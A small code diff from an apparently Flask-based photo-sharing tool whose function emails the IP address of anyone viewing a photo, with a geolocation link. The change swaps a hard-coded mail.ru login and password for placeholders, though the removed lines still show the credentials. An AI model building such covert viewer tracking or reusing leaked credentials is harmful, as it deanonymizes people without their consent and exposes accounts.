@@ -90,8 +90,8 @@ def mailgo(mail):
         ip = str(request.headers.get('X-Forwarded-For', request.remote_addr))
         url = 'smtp.mail.ru'
         toaddr = mail
-        login = 'spam.bot.tg@bk.ru'
-        password = 'sptg123123'
+        login = 'почта'
+        password = 'пароль'
         message = "IP посмотревшего фото: " + ip + " \nБольше: https://geoipt.herokuapp.com/" + ip + "--------\nP.S. Всеволод html"
         msg = MIMEMultipart()
         msg['Subject'] = 'IP по фото VsevolodHTML'
